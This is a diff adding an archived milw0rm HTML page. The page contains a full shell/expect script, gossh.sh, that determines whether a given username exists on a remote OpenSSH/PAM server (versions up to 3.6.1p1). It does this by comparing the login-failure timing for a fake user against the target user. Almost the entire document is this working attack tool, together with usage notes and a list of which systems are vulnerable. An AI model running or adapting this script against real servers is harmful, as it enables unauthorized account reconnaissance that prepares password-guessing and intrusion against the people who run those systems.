@@ -1,0 +1,146 @@
+<html>
+<head>
+<title>OpenSSH/PAM <= 3.6.1p1 Remote Users Ident (gossh.sh)
+</title>
+<pre>
+#!/bin/sh
+# OpenSSH &lt;= 3.6.p1 - User Identification.
+# Nicolas Couture - nc@stormvault.net
+#
+# Description:
+#	-Tells you wether or not a user exist on
+#	  a distant server running OpenSSH.
+# 
+# Usage:
+#	-You NEED to have the host's public key
+#	  before executing this script. 
+#
+
+#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
+# Fact Sheet:				#
+#	  o It is really accurate against		#
+#	    redhat boxes.			#
+# 	  o Linux boxes running grsecurity		#
+#	    has 10 seconds delay on both		#
+#	    valid AND invalid user login		#
+#	    attempts.			#
+#	  o *BSD boxes are not vulnerables and	#
+#	     always has 10 seconds delay like  	#
+#	     Linux-Grsec + network protection   	#
+#					#
+#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-#
+
+#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=#
+# History:				 
+#	 Thu May  1 15:41:18 EDT 2003  
+#	  ; Script started.		
+#	 Thu May  1 16:42:30 EDT 2003	
+#	  ; Script is functional.	             
+#=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=#
+
+# Let the user know how we work.
+usage(){
+ echo &quot;$0 &lt;user&gt; &lt;host&gt;&quot;
+ exit 1
+}
+
+# Verify the arguments.
+[ $# != 2 ] &amp;&amp; usage
+
+# Variables.
+USER=&quot;$1&quot;
+HOST=&quot;$2&quot;
+
+#=-=-=-=-=-=-=-=-=-=-=-=-=#
+# Expect script functions         #
+#=-=-=-=-=-=-=-=-=-=-=-=-=#
+
+# Expect script for password.
+expasswd() {
+cat &lt;&lt; EOF &gt; expasswd 
+spawn $SSHCMD
+expect password:
+send '\r'
+interact
+EOF
+}
+
+# Expect script for error.
+experror() {
+cat &lt;&lt; EOF &gt; experror
+spawn expect -f expasswd
+expect again.
+exit 1593
+interact
+EOF
+}
+
+#=-=-=-=-=-=-=-=-=-=#
+# -Fake user timing      #
+#=-=-=-=-=-=-=-=-=-=#
+
+# OpenSSH client command for inexisting user.
+export SSHCMD=&quot;ssh nicolas_couture@$HOST&quot;
+
+# Build new expect script.
+expasswd
+experror
+
+# Timing.
+FDATE0=`date '+%s'`
+echo &quot;[-] Calculating fake user timeout...&quot;
+expect -f experror 1&gt; /dev/null 2&gt; /dev/null
+FDATE1=`date '+%s'`
+
+# Fake user timeout.
+FUTO=`echo $FDATE1 - $FDATE0 | bc`
+echo &quot;[+] Found $FUTO.&quot;
+
+#=-=-=-=-=-=-=-=#
+# -$USER timing    #
+#=-=-=-=-=-=-=-=#
+
+# OpenSSH command.
+export SSHCMD=&quot;ssh $USER@$HOST&quot;
+
+# Build new expect scripts.
+expasswd
+experror
+
+DATE0=`date '+%s'`
+echo &quot;[-] Calculating $USER timeout on $SERVER...&quot;
+expect -f experror 1&gt; /dev/null 2&gt; /dev/null
+DATE1=`date '+%s'`
+
+# $USER timeout.
+END=`echo $DATE1 - $DATE0 | bc`
+echo &quot;[+] Found $END.&quot;
+
+#=-=-=-=-=#
+# -Result    #
+#=-=-=-=-=#
+
+if [ &quot;$FUTO&quot; -eq &quot;$END&quot; ] &amp;&amp; [ &quot;$FUTO&quot; -eq &quot;10&quot; ]; then
+ echo &quot;This box is not vulnerable.&quot;
+ exit 1
+fi
+
+# Use of our magic skills.
+if [ &quot;$FUTO&quot; -lt &quot;$END&quot; ]; then
+ echo &quot;$USER exist on $HOST.&quot;
+elif [ &quot;$FUTO&quot; -ge &quot;$END&quot; ]; then
+ echo &quot;$USER doesn't exist on $HOST.&quot;
+else
+ echo &quot;Segmentation fault.&quot;
+ exit 13
+fi
+
+# Remove tmp files.
+rm -rf expasswd experror
+
+# EOF
+
+# milw0rm.com [2003-05-02]
+</pre>
+</html>
+
